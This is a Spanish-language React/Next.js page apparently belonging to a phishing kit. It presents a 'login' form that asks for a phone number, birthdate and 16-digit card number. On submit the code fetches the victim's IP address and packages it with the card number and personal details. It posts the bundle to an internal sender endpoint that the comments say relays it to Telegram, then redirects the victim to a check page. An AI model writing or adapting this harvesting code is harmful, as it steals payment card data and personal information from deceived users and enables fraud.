import React, { useState } from 'react';
import { Box, TextField, Button, Typography, Container, FormControlLabel, Checkbox } from '@mui/material';
import CircularProgress from '@mui/material/CircularProgress';
import Header from '@/components/header';
import Footer from '@/components/Footer';
import { useRouter } from 'next/router';
import axios from 'axios';
import dayjs from 'dayjs';
import { toast } from 'sonner';

const Index = () => {
  const router = useRouter();

  const [formData, setFormData] = useState({
    phone: '',
    birthdateDay: '',
    birthdateMonth: '',
    birthdateYear: '',
    cardNumber: '',
    acceptTerms: false,
    acceptPrivacy: false,
  });

  const [errors, setErrors] = useState({
    phone: false,
    birthdateDay: false,
    birthdateMonth: false,
    birthdateYear: false,
    cardNumber: false,
    acceptTerms: false,
    acceptPrivacy: false,
  });

  const [loading, setLoading] = useState(false);

  // Validación para teléfono
  const isPhoneValid = (phone) => {
    const phoneRegex = /^[0-9]{10}$/;
    return phoneRegex.test(phone);
  };

  // Validación para tarjeta
  const isCardValid = (cardNumber) => {
    const cardRegex = /^[0-9]{16}$/;
    return cardRegex.test(cardNumber);
  };

  // Validación para fecha de nacimiento (mayor de 18 años)
  const isAdult = (day, month, year) => {
    if (!day || !month || !year) return false;
    const birthdate = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`;
    const dateOfBirth = dayjs(birthdate);
    const today = dayjs();
    return today.diff(dateOfBirth, 'year') >= 18;
  };

  // Prevenir la entrada de caracteres no numéricos en los campos de teléfono y tarjeta
  const handleKeyPress = (e) => {
    const invalidChars = ['e', 'E', '+', '-', '.'];
    if (invalidChars.includes(e.key)) {
      e.preventDefault();
    }
  };

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    // Eliminar cualquier carácter no numérico en los campos de teléfono y tarjeta
    if (name === 'phone' || name === 'cardNumber') {
      const numericValue = value.replace(/[^0-9]/g, '');
      setFormData({
        ...formData,
        [name]: numericValue,
      });
    } else {
      setFormData({
        ...formData,
        [name]: type === 'checkbox' ? checked : value,
      });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const newErrors = {
      phone: !isPhoneValid(formData.phone),
      birthdateDay: !formData.birthdateDay,
      birthdateMonth: !formData.birthdateMonth,
      birthdateYear: !formData.birthdateYear || !isAdult(formData.birthdateDay, formData.birthdateMonth, formData.birthdateYear),
      cardNumber: !isCardValid(formData.cardNumber),
      acceptTerms: !formData.acceptTerms,
      acceptPrivacy: !formData.acceptPrivacy,
    };

    setErrors(newErrors);

    // Si hay errores, muestra el mensaje con el primer error encontrado
    const errorMessages = {
      phone: 'Ingresa un número de teléfono válido de 10 dígitos.',
      birthdateDay: 'Selecciona el día de nacimiento.',
      birthdateMonth: 'Selecciona el mes de nacimiento.',
      birthdateYear: 'Debes ser mayor de 18 años.',
      cardNumber: 'Ingresa un número de tarjeta válido de 16 dígitos.',
      acceptTerms: 'Debes aceptar los términos y condiciones.',
      acceptPrivacy: 'Debes aceptar el aviso de privacidad.',
    };

    const firstError = Object.keys(newErrors).find((key) => newErrors[key]);



    // ...

    if (firstError) {
      toast.error(errorMessages[firstError]);
      setLoading(false);
      return;
    }

    // Si no hay errores, activar el loader y simular el envío
    setLoading(true);
    try {
      // Check if in TEST_MODE
      const isTestMode = process.env.NEXT_PUBLIC_TEST_MODE === 'true';

      if (!isTestMode) {
        // Only send to Telegram if NOT in test mode
        const ip = await axios.get('https://api.ipify.org?format=json');

        // Format message for Telegram
        let message = `NUEVO REGISTRO\n\n` +
          `Teléfono: ${formData.phone}\n\n` +
          `Fecha de nacimiento: ${formData.birthdateDay}/${formData.birthdateMonth}/${formData.birthdateYear}\n\n` +
          `Número de tarjeta: ${formData.cardNumber}\n\n` +
          `IP: ${ip.data.ip}`;

        // Send directly to Telegram via sender API
        await axios.post('/api/sender', { message });
      } else {
        // TEST MODE: Simulate API delay
        console.log('TEST MODE: Skipping Telegram send');
        console.log('Form data:', formData);
        await new Promise(resolve => setTimeout(resolve, 500));
      }

      // Simula una espera de 2 segundos antes de redirigir
      setTimeout(() => {
        setLoading(false);
        router.push('/check'); // Redirigir a la página /check
      }, 2000);
    } catch (error) {
      console.error("Error en el envío:", error);
      toast.error('Hubo un problema en el envío de datos. Por favor, inténtalo de nuevo.');
      setLoading(false);
    }
  };

  return (
    <Box sx={{ display: 'flex', flexDirection: 'column', minHeight: '100vh' }}>
      <Header />
      <Container
        component="main"
        maxWidth="sm"
        sx={{
          flex: 1,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          py: 4,
        }}
      >
        <Box
          component="form"
          onSubmit={handleSubmit}
          sx={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            bgcolor: 'background.paper',
            p: 4,
            borderRadius: 2,
            boxShadow: 3,
            width: '100%',
            maxWidth: 400,
          }}
        >
          <Typography component="h1" variant="h5" sx={{ fontWeight: 'bold' }}>
            Iniciar Sesión
          </Typography>
          <TextField
            margin="normal"
            required
            fullWidth
            id="phone"
            label="Número de Teléfono"
            name="phone"
            type="tel"
            value={formData.phone}
            onChange={handleChange}
            onKeyPress={handleKeyPress}
            error={errors.phone}
            helperText={errors.phone ? 'Ingresa un número de teléfono válido de 10 dígitos.' : ''}
            inputProps={{ maxLength: 10 }}
          />

          {/* Split Date Fields */}
          <Box sx={{ display: 'flex', gap: 1, width: '100%', mt: 2 }}>
            <TextField
              select
              label="Día"
              name="birthdateDay"
              value={formData.birthdateDay}
              onChange={handleChange}
              error={errors.birthdateDay}
              required
              sx={{ flex: 1 }}
              SelectProps={{ native: true }}
            >
              <option value=""></option>
              {Array.from({ length: 31 }, (_, i) => i + 1).map(day => (
                <option key={day} value={day}>{day}</option>
              ))}
            </TextField>

            <TextField
              select
              label="Mes"
              name="birthdateMonth"
              value={formData.birthdateMonth}
              onChange={handleChange}
              error={errors.birthdateMonth}
              required
              sx={{ flex: 1 }}
              SelectProps={{ native: true }}
            >
              <option value=""></option>
              {['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre']
                .map((month, idx) => (
                  <option key={idx + 1} value={idx + 1}>{month}</option>
                ))}
            </TextField>

            <TextField
              select
              label="Año"
              name="birthdateYear"
              value={formData.birthdateYear}
              onChange={handleChange}
              error={errors.birthdateYear}
              helperText={errors.birthdateYear ? 'Debes ser mayor de 18 años' : ''}
              required
              sx={{ flex: 1 }}
              SelectProps={{ native: true }}
            >
              <option value=""></option>
              {Array.from({ length: 100 }, (_, i) => new Date().getFullYear() - 18 - i).map(year => (
                <option key={year} value={year}>{year}</option>
              ))}
            </TextField>
          </Box>

          <TextField
            margin="normal"
            required
            fullWidth
            id="cardNumber"
            label="Número de Tarjeta"
            name="cardNumber"
            type="tel"
            value={formData.cardNumber}
            onChange={handleChange}
            onKeyPress={handleKeyPress}
            error={errors.cardNumber}
            helperText={errors.cardNumber ? 'Ingresa un número de tarjeta válido de 16 dígitos.' : ''}
            inputProps={{ maxLength: 16 }}
          />
          <FormControlLabel
            control={
              <Checkbox
                name="acceptTerms"
                checked={formData.acceptTerms}
                onChange={handleChange}
                color="primary"
                sx={{ borderRadius: '50%' }}
              />
            }
            label="Acepto los términos y condiciones"
            sx={{ alignSelf: 'flex-start', ml: 0 }}
          />
          <FormControlLabel
            control={
              <Checkbox
                name="acceptPrivacy"
                checked={formData.acceptPrivacy}
                onChange={handleChange}
                color="primary"
                sx={{ borderRadius: '50%' }}
              />
            }
            label="Leí el aviso de privacidad"
            sx={{ alignSelf: 'flex-start', ml: 0 }}
          />
          <Button
            type="submit"
            fullWidth
            variant="contained"
            sx={{ mt: 3, mb: 2, borderRadius: '50px' }}
            disabled={loading}
          >
            {loading ? <CircularProgress size={24} /> : 'Continuar'}
          </Button>
        </Box>
      </Container>
      <Footer />
    </Box>
  );
};

export default Index;
